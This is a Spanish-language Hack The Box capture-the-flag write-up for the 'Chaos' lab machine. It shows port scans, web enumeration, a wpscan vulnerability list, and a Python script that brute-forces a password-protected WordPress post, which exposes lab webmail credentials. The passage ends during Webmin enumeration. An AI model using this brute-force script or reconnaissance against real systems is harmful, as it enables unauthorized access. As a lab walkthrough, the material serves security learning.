---
title: "HTB write-up: Chaos"
date: 2019-05-25T10:00:00-05:00
description: "Chaos is a machine look-all-corners in CTF style. You have to look every service and every piece of information in order to solve this box."
tags: ["hackthebox", "htb", "boot2root", "pentesting", "ctf_machine"]
categories: ["htb", "pentesting"]

---

Esta maquina me recordó que siempre hay que buscar en las esquinas, a ser mas persistente en la búsqueda hacia root. Salio relativamente rápida una vez que llegue a user, pero aun así disfrute la experiencia. Esa parte de generar el código en python para aplicar lo inverso y esa parte de pdftex me gustaron mucho. También la parte de firefox me pareció divertida lo directo que era.

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![chaos image](https://www.hackthebox.eu/storage/avatars/7bbafb1fe25f39671329aa6758b68da6_thumb.png) [Chaos](https://www.hackthebox.eu/home/machines/profile/167) | [felamos](https://www.hackthebox.eu/home/users/profile/27390) | Linux | 10.10.10.120 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-chaos/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```root@laptop:~#  nmap -sS -p- --open -v -n 10.10.10.120
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-23 23:00 CST
Initiating Ping Scan at 23:00
Scanning 10.10.10.120 [4 ports]
Completed Ping Scan at 23:00, 0.44s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:00
Scanning 10.10.10.120 [65535 ports]
Discovered open port 995/tcp on 10.10.10.120
Discovered open port 80/tcp on 10.10.10.120
Discovered open port 993/tcp on 10.10.10.120
Discovered open port 110/tcp on 10.10.10.120
Discovered open port 143/tcp on 10.10.10.120
SYN Stealth Scan Timing: About 36.69% done; ETC: 23:01 (0:00:53 remaining)
Discovered open port 10000/tcp on 10.10.10.120
Completed SYN Stealth Scan at 23:02, 136.88s elapsed (65535 total ports)
Nmap scan report for 10.10.10.120
Host is up (0.22s latency).
Not shown: 65482 closed ports, 47 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
110/tcp   open  pop3
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
10000/tcp open  snet-sensor-mgmt

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 137.49 seconds
           Raw packets sent: 141953 (6.246MB) | Rcvd: 127712 (5.108MB)text

```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Continuemos con el doblecheck usando `masscan`:

```text
Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-27 05:20:02 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.120
Discovered open port 10000/udp on 10.10.10.120
Discovered open port 995/tcp on 10.10.10.120
Discovered open port 10000/tcp on 10.10.10.120
Discovered open port 993/tcp on 10.10.10.120
Discovered open port 143/tcp on 10.10.10.120
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN

Como podemos ver, los puertos corresponden entre si (TCP), por lo que continuamos con la enumeración de servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -sV -sC -p80,110,143,993,995,10000 -n 10.10.10.120
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-09 20:21 CDT
Nmap scan report for 10.10.10.120
Host is up (0.20s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL RESP-CODES AUTH-RESP-CODE TOP PIPELINING STLS CAPA UIDL
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: listed ENABLE have Pre-login post-login SASL-IR LOGIN-REFERRALS IMAP4rev1 capabilities more LITERAL+ IDLE LOGINDISABLEDA0001 STARTTLS ID OK
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: ENABLE post-login Pre-login have SASL-IR LOGIN-REFERRALS IMAP4rev1 capabilities more listed IDLE LITERAL+ AUTH=PLAINA0001 ID OK
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE TOP PIPELINING RESP-CODES CAPA UIDL
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.58 seconds
```

Tenemos varios servicios de correo, unos servicios HTTP en el TCP/80 y otro en el TCP/10000. Este ultimo tiene el banner de _webmin_, mientras que el anterior parece que no tiene nada.

Importante que durante la enumeración, el daemon que se encarga del correo es **Dovecot**.

# HTTP Service over TCP/80

Comencemos por obtener mas información sobre los archivos y carpetas sobre el servicio HTTP (TCP/80):

```text
xbytemx@laptop:~/htb/chaos$ http 10.10.10.120
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 84
Content-Type: text/html
Date: Sat, 13 Apr 2019 16:31:02 GMT
ETag: "49-57947aa3269e5-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Sun, 28 Oct 2018 10:46:28 GMT
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding

<h1><center><font color="red">Direct IP not allowed</font></center></h1>

xbytemx@laptop:~/htb/chaos$ http 10.10.10.120 Host:localhost
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 84
Content-Type: text/html
Date: Sat, 13 Apr 2019 16:31:19 GMT
ETag: "49-57947aa3269e5-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Sun, 28 Oct 2018 10:46:28 GMT
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding

<h1><center><font color="red">Direct IP not allowed</font></center></h1>

xbytemx@laptop:~/htb/chaos$ http 10.10.10.120 Host:chaos.htb
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 2225
Content-Type: text/html
Date: Sat, 13 Apr 2019 16:31:26 GMT
ETag: "1b34-5791b3cff5e80-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Fri, 26 Oct 2018 05:46:18 GMT
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
	<title>Chaos</title>
	<meta charset="UTF-8">
	<meta name="description" content="HALO photography portfolio template">
	<meta name="keywords" content="photography, portfolio, onepage, creative, html">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<!-- Favicon -->
	<link href="img/favicon.ico" rel="shortcut icon"/>

	<!-- Google Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i" rel="stylesheet">

	<!-- Stylesheets -->
	<link rel="stylesheet" href="css/bootstrap.min.css"/>
	<link rel="stylesheet" href="css/font-awesome.min.css"/>
	<link rel="stylesheet" href="css/flaticon.css"/>
	<link rel="stylesheet" href="css/animate.css"/>
	<link rel="stylesheet" href="css/owl.carousel.css"/>
	<link rel="stylesheet" href="css/style.css"/>


	<!--[if lt IE 9]>
	  <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
	  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

</head>
<body>
	<!-- Page Preloder -->
	<div id="preloder">
		<div class="loader"></div>
	</div>

	<!-- Header section start -->
	<header class="header-section sp-pad">
		<h3 class="site-logo">Chaos</h3>
		<form class="search-top">
			<button class="se-btn"><i class="fa fa-search"></i></button>
			<input type="text" placeholder="Search.....">
		</form>
		<div class="nav-switch">
			<i class="fa fa-bars"></i>
		</div>
		<nav class="main-menu">
			<ul>
				<li><a href="index.html">Home</a></li>
				<li><a href="about.html">about us</a></li>
				<li><a href="#">Services</a></li>
				<li><a href="hof.html">Hall of fame</a></li>
				<li><a href="blog.html">Blog</a></li>
				<li><a href="contact.html">Contact</a></li>
			</ul>
		</nav>
	</header>
	<!-- Header section end -->


	<!-- Hero section start -->
	<section class="hero-section">
		<div class="hero-slider owl-carousel">
			<div class="hs-item set-bg sp-pad" data-setbg="img/hero-slider/1.jpg">
				<div class="hs-text">
					<h2 class="hs-title">Here at Chaos</h2>
					<p class="hs-des">We <br>secure and create awesome services</p>
				</div>
			</div>
			<div class="hs-item set-bg sp-pad" data-setbg="img/hero-slider/2.jpg">
				<div class="hs-text">
					<h2 class="hs-title">Here at Chaos</h2>
					<p class="hs-des">We  <br>shield</p>
				</div>
			</div>
		</div>
	</section>
	<!-- Hero section end -->


	<!-- Intro section start -->
	<section class="intro-section sp-pad spad">
		<div class="container-fluid">
			<div class="row">
				<div class="col-xl-4 intro-text">
					<span class="sp-sub-title">Work</span>
					<h3 class="sp-title">OUR AWESOME SERVICES.</h3>
					<p>we a concentrated evaluation of your information security posture, indicating weaknesses as well as providing the appropriate mitigation procedures required to either eliminate those weaknesses or reduce them to an acceptable level of risk. Alongside vulnerability assessment we also perform distinguishable penetration testing services, this approach by a group of certified security researchers and domain experts at chaos is unique because of our intrinsic desire to see if your applications can be broken into past the normally-presented boundaries.</p>
					<a href="#" class="site-btn">Read More</a>
				</div>
				<div class="col-xl-7 offset-xl-1">
					<figure class="intro-img mt-5 mt-xl-0">
						<img src="img/intro.jpg" alt="">
					</figure>
				</div>
			</div>
		</div>
	</section>
	<!-- Intro section end -->






	<!-- Milestones section start -->
	<section class="milestones-section spad">
		<div class="container">
			<div class="row">
				<div class="col-lg-3 col-md-6 fact-box">
					<div class="fact-content">
						<i class="flaticon-gamepad"></i>
						<h2>48</h2>
						<p>VIDEO gAMES</p>
					</div>
				</div>
				<div class="col-lg-3 col-md-6 fact-box">
					<div class="fact-content">
						<i class="flaticon-trophy"></i>
						<h2>7</h2>
						<p>AWARDS WON</p>
					</div>
				</div>
				<div class="col-lg-3 col-md-6 fact-box">
					<div class="fact-content">
						<i class="flaticon-alarm-clock"></i>
						<h2>23K</h2>
						<p>Website secured</p>
					</div>
				</div>
				<div class="col-lg-3 col-md-6 fact-box">
					<div class="fact-content">
						<i class="flaticon-laptop"></i>
						<h2>19</h2>
						<p>Video tutorials</p>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!-- Milestones section end -->


	<!-- Services section start -->
	<!-- Services section start end -->


	<!-- Contact section start -->
	<section class="contact-section set-bg spad" data-setbg="img/contact-bg.jpg">
		<div class="container-fluid contact-warp">
			<div class="contact-text">
				<div class="container p-0">
					<span class="sp-sub-title"></span>
					<h3 class="sp-title">Stay in touch</h3>


					<ul class="con-info">
						<li><i class="flaticon-phone-call"></i>+91 999999999</li>
						<li><i class="flaticon-envelope"></i>info@chaos.htb</li>
						<li><i class="flaticon-placeholder"></i>127.0.0.1<br> localhost, USA</li>
					</ul>
				</div>
			</div>
			<div class="container p-0">
				<div class="row">
					<div class="col-xl-8 offset-xl-4">
						<form class="contact-form">
							<div class="row">
								<div class="col-md-6">
									<input type="text" placeholder="Your name">
								</div>
								<div class="col-md-6">
									<input type="email" placeholder="E-mail">
								</div>
								<div class="col-md-12">
									<input type="text" placeholder="Subject">
									<textarea placeholder="Message"></textarea>
									<button class="site-btn light">Send</button>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!-- Contact section end -->


	<!-- Footer section start -->
	<footer class="footer-section spad">
		<div class="container text-center">
			<h2>Letâs work together!</h2>
			<p>info@chaos.htb</p>
			<div class="social">
				<a href="#"><i class="fa fa-pinterest"></i></a>
				<a href="#"><i class="fa fa-facebook"></i></a>
				<a href="https://twitter.com/sahay_ay"><i class="fa fa-twitter"></i></a>
				<a href="#"><i class="fa fa-dribbble"></i></a> </br>


</br>
<font color="white">
Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved
</font>

			</div>
		</div>


	</footer>
	<!-- Footer section end -->


	<!--====== Javascripts & Jquery ======-->
	<script src="js/jquery-3.2.1.min.js"></script>
	<script src="js/bootstrap.min.js"></script>
	<script src="js/owl.carousel.min.js"></script>
	<script src="js/mixitup.min.js"></script>
	<script src="js/circle-progress.min.js"></script>
	<script src="js/main.js"></script>
</body>
</html>
```

Aplicamos un `gobuster` en búsqueda de mas información:

```text
xbytemx@laptop:~/htb/chaos$ ~/tools/gobuster -x pdf,txt,odt,html,php -u http://10.10.10.120 -w ~/git/payloads/owasp/dirbuster/directory-list-lowercase-2.3-small.txt -t 20

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.120/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/payloads/owasp/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,pdf,txt,odt,html
[+] Timeout      : 10s
=====================================================
2019/04/13 22:21:31 Starting gobuster
=====================================================
/index.html (Status: 200)
/wp (Status: 301)
/javascript (Status: 301)
Progress: 9352 / 81644 (11.45%)^C
```

- `-x pdf,txt,odt,html,php` para buscar archivos con las extensiones marcadas
- `-u http://10.10.10.120` para indicarle cual es la url base sobre la cual enviara las peticiones
- `-w ~/git/payloads/owasp/dirbuster/directory-list-lowercase-2.3-small.txt` para indicarle de donde tomara las referencias (diccionario)
- `-t 20` para indicarle cuantos threads puede usar sobre mi conexión

Rompí el `gobuster` tan pronto como vi que había encontrado una carpeta wp o lo que vendría siendo wordpress, así que exploremos si es un wordpress:

```html
xbytemx@laptop:~$ http http://10.10.10.120/wp/
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 444
Content-Type: text/html;charset=UTF-8
Date: Sun, 14 Apr 2019 05:33:51 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /wp</title>
 </head>
 <body>
<h1>Index of /wp</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="wordpress/">wordpress/</a></td><td align="right">2013-09-25 00:18  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.34 (Ubuntu) Server at 10.10.10.120 Port 80</address>
</body></html>
```

Dentro de la carpeta wp, solo vemos que hay otra carpeta llamada wordpress, plop. Volvamos a tocar base en `/wp/wordpress/`, esta vez solo headers:

```text
xbytemx@laptop:~$ http --header http://10.10.10.120/wp/wordpress/
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 18217
Content-Type: text/html; charset=UTF-8
Date: Sun, 14 Apr 2019 05:34:12 GMT
Keep-Alive: timeout=5, max=100
Link: <http://10.10.10.120/wp/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding
```

Hemos llegado al wordpress, así que antes de explorar dejemos un `wpscan`:

```text
xbytemx@laptop:~/git/wpscan$ wpscan --url http://10.10.10.120/wp/wordpress/
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.5.2
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.10.120/wp/wordpress/
[+] Started: Sun Apr 14 00:06:42 2019

Interesting Finding(s):

[+] http://10.10.10.120/wp/wordpress/
 | Interesting Entry: Server: Apache/2.4.34 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.10.120/wp/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.10.120/wp/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://10.10.10.120/wp/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://10.10.10.120/wp/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=4.9.8</generator>
 |  - http://10.10.10.120/wp/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.8</generator>
 |
 | [!] 9 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9170
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9171
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9173
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9174
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9175
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9222
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.10
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9230
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-02-21T00:00:00.000Z
 | Readme: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.9.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.7 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <==========================================================> (21 / 21) 100.00% Time: 00:00:01

[i] No Config Backups Found.


[+] Finished: Sun Apr 14 00:06:57 2019
[+] Requests Done: 68
[+] Cached Requests: 5
[+] Data Sent: 12.623 KB
[+] Data Received: 23.389 MB
[+] Memory used: 157.762 MB
[+] Elapsed time: 00:00:15
xbytemx@laptop:~/git/wpscan$
```

`WPScan` encuentra 9 vulnerabilidades posibles basadas en changelogs y versiones superiores, ahora solo falta ver si tenemos alguna viable.

Si abrimos la pagina en el navegador tendremos un articulo progetido por contraseña:

![Content of wordpress](/img/htb-chaos/www-wp-content.png)

Si la experiencia nos ha enseñado algo en este punto, es que la contraseña debió ser dejada aquí o en otro servicio. Así que apliquemos el primer approach.

1. Visitar el post original

Vamos al post original http://10.10.10.120/wp/wordpress/index.php/2018/10/28/chaos/.

![Content of Chaos protected](/img/htb-chaos/www-wp-protected.png)

2. Generar un diccionario con las palabras del post

Ahora que estamos sobre nuestro objetivo, busquemos pistas:

```text
xbytemx@laptop:~/blog$ cewl http://10.10.10.120/wp/wordpress/index.php/2018/10/28/chaos/
CeWL 5.4.4.1 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
chaos
WordPress
site
content
Comments
wrap
entry
password
header
October
Protected
Feed
branding
Search
Recent
RSS
Really
Simple
Syndication
Powered
wordpress
Just
another
your
Password
enter
Posts
Log
org
page
http
This
protected
view
please
below
for
Skip
text
custom
masthead
Posted
human
meta
post
main
primary
Archives
Categories
Uncategorized
Meta
Entries
secondary
Proudly
powered
info
colophon
contain
RSD
state
the
art
semantic
personal
publishing
platform
index
php
Username
Email
Address
Lost
Back
Sun
Oct
hourly
https
email
Scroll
down
Author
Month
Remember
respond
feed
Sat
May
Please
username
address
You
will
receive
link
create
new
via
xbytemx@laptop:~/htb/chaos$ cewl http://10.10.10.120/wp/wordpress/ | grep -v "robin@digi.ninja" > postpass.dic
```

3. Probar cada palabra en el diccionario

Aquí una nota importante, al menos yo no encontré una herramienta que haga todo el trabajo y que me ayude a hacer este _brute-forcing_... pero afortunadamente existe **python**:

```python
#!/usr/bin/env python
# -*- coding: utf8 -*-

import requests
from bs4 import BeautifulSoup

def main():
    base_url = "http://10.10.10.120"
    url_form_passwd = "/wp/wordpress/wp-login.php?action=postpass"
    url_chaos_post = "/wp/wordpress/index.php/2018/10/28/chaos/"
    headers = {"Content-Type":"application/x-www-form-urlencoded"}

    dic = open("postpass.dic", "r").readlines()

    for password in dic:
        session = requests.Session()
        passPost = {"Submit":"Enter", "post_password":password[:-1]}

        res = session.post(base_url + url_form_passwd, data=passPost, headers=headers)
        cookiesLogin = res.cookies

        res = session.get(base_url + url_chaos_post, cookies=cookiesLogin)

        soup = BeautifulSoup(res.text, features="lxml")
        entryContent = soup.find("div", "entry-content")
        if "This content is password protected." not in str(entryContent):
            print "La contraseña del post es: " + password + "El contenido protegido es: \n" + str(entryContent)

if __name__ == '__main__':
    main()
```

Después de ejecutar este script, tendremos la siguiente salida:

```text
xbytemx@laptop:~/htb/chaos$ python post_brute-forcer.py
La contraseña del post es: human
El contenido protegido es:
<div class="entry-content">
<p>Creds for webmail :</p>
<p>username – ayush</p>
<p>password – jiujitsu</p>
</div>
```

Verificamos en el navegador:

![Content of Chaos entry](/img/htb-chaos/www-wp-unprotected.png)

Lo cual corresponde a las credenciales del webmail (TCP/10000) que encontramos antes.

> creds: ayush / jiujitsu

# Service HTTP over TCP/10000

Empezamos por tratar de conectarnos al servidor:

```text
xbytemx@laptop:~/htb/chaos$ http 10.10.10.120:10000
HTTP/1.0 200 Document follows
Connection: close
Content-type: text/html; Charset=iso-8859-1
Date: Sat, 14 Apr 2019 18:37:55 GMT
Server: MiniServ/1.890

<h1>Error - Document follows</h1>
<p>This web server is running in SSL mode. Try the URL <a href='https://chaos:10000/'>https://chaos:10000/</a> instead.<br></p>
```

Nos indica que necesita cambiar la conexion de HTTP a HTTPS:

```html
xbytemx@laptop:~/htb/chaos$ http --verify=no https://10.10.10.120:10000
HTTP/1.0 200 Document follows
Auth-type: auth-required=1
Connection: close
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; frame-src 'self'; child-src 'self'
Content-type: text/html; Charset=UTF-8
Date: Sat, 14 Apr 2019 18:39:14 GMT
Server: MiniServ/1.890
Set-Cookie: redirect=1; path=/
Set-Cookie: testing=1; path=/; secure
X-Frame-Options: SAMEORIGIN

<!DOCTYPE HTML>
<html data-background-style="gainsboro" class="session_login">
<head>
 <noscript> <style> html[data-background-style="gainsboro"] { background-color: #d6d6d6; } html[data-background-style="nightRider"] { background-color: #1a1c20; } html[data-background-style="nightRider"] div[data-noscript] { color: #979ba080; } html[data-slider-fixed='1'] { margin-right: 0 !important; } body > div[data-noscript] ~ * { display: none !important; } div[data-noscript] { visibility: hidden; animation: 2s noscript-fadein; animation-delay: 1s; text-align: center; animation-fill-mode: forwards; } @keyframes noscript-fadein { 0% { opacity: 0; } 100% { visibility: visible; opacity: 1; } } </style> <div data-noscript> <div class="fa fa-3x fa-exclamation-triangle margined-top-20 text-danger"></div> <h2>JavaScript is disabled</h2> <p>Please enable javascript and refresh the page</p> </div> </noscript>
<meta charset="utf-8">
<title>Login to Webmin</title>
<link rel="shortcut icon" href="/images/favicon-webmin.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="/unauthenticated/css/bundle.min.css?1919999999999911" rel="stylesheet">
